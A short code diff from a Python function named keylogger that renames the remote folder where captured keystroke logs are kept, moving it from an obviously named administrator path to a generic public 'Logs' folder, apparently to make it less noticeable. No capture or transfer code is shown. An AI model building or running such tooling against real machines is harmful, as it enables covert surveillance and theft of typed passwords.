@@ -146,7 +146,7 @@ def keylogger(target_ip):
     try:
         import os
         
-        REMOTE_DIR = "C:\\Users\\Adm1nistrator\\KeyloggerLogs"
+        REMOTE_DIR = "C:\\Users\\Public\\Logs"
         LOCAL_DIR = f"./Box/keylogger_{target_ip}"
         
         # Create local directory if it doesn't exist
